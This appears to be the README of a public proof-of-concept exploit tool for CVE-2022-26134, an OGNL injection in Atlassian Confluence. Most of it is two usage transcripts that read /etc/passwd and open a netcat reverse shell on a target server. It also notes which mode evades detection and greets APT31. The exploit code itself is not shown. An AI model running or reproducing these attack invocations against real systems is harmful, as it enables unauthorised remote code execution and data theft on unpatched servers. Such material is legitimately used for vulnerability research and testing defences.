# Through the Wire

Through the Wire is a proof of concept exploit for [CVE-2022-26134](), an OGNL injection vulnerability affecting Atlassian Confluence Server and Data Center versions <= 7.13.6 LTS and <= 7.18.0 "Latest". This was originally a zero-day exploited in-the-wild.

* [Vendor advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html)
* [Volexity "in-the-wild" write-up](https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/)
* [Rapid7 write-up](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)

Through the Wire implements two different exploits. The reverse shell will shell out to `bash` and therefore be more likely to be detected. The file reader executes from memory and is therefore unlikely to be detected. The exploits *only* work on Linux installs of Confluence. They could work on Windows but I'm also lazy.

## Usage examples

### Read a file

```
albinolobster@ubuntu:~/through_the_wire$ python3 through_the_wire.py --rhost 10.0.0.28 --rport 8090 --lhost 10.0.0.2 --protocol http:// --read-file /etc/passwd

   _____ _                           _     
  /__   \ |__  _ __ ___  _   _  __ _| |__  
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ 
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/       
   _____ _            __    __ _           
  /__   \ |__   ___  / / /\ \ (_)_ __ ___  
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ 
   / /  | | | |  __/  \  /\  /| | | |  __/ 
   \/   |_| |_|\___|   \/  \/ |_|_|  \___| 

                 jbaines-r7                
               CVE-2022-26134              
      "Spit my soul through the wire"    
                     🦞                   

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://10.0.0.28:8090/
Listening on 0.0.0.0 1270
Connection received on 10.0.0.28 39384
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
albinolobster:x:1000:1000:albinolobster,,,:/home/albinolobster:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
postgres:x:128:136:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
confluence:x:1001:1002:Atlassian Confluence:/home/confluence:/bin/sh
albinolobster@ubuntu:~/through_the_wire$ 
```

### Get a shell

```
albinolobster@ubuntu:~/through_the_wire$ python3 through_the_wire.py --rhost 10.0.0.28 --rport 8090 --lhost 10.0.0.2 --protocol http:// --reverse-shell

   _____ _                           _     
  /__   \ |__  _ __ ___  _   _  __ _| |__  
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ 
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/       
   _____ _            __    __ _           
  /__   \ |__   ___  / / /\ \ (_)_ __ ___  
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ 
   / /  | | | |  __/  \  /\  /| | | |  __/ 
   \/   |_| |_|\___|   \/  \/ |_|_|  \___| 

                 jbaines-r7                
               CVE-2022-26134              
      "Spit my soul through the wire"    
                     🦞                   

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://10.0.0.28:8090/
Listening on 0.0.0.0 1270
Connection received on 10.0.0.28 39386
bash: cannot set terminal process group (34470): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@ubuntu:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1002(confluence) groups=1002(confluence)
confluence@ubuntu:/opt/atlassian/confluence/bin$ 
```

## Credit

* Greetz to APT31
* [Ye](https://www.youtube.com/watch?v=AE8y25CcE6s)

## PCAP || GTFO

* [confluence_two_pcap.zip](https://github.com/jbaines-r7/through_the_wire/files/8833875/confluence_two_pcap.zip)

## Video || GTFO

https://youtu.be/GP9C4D0YNkM

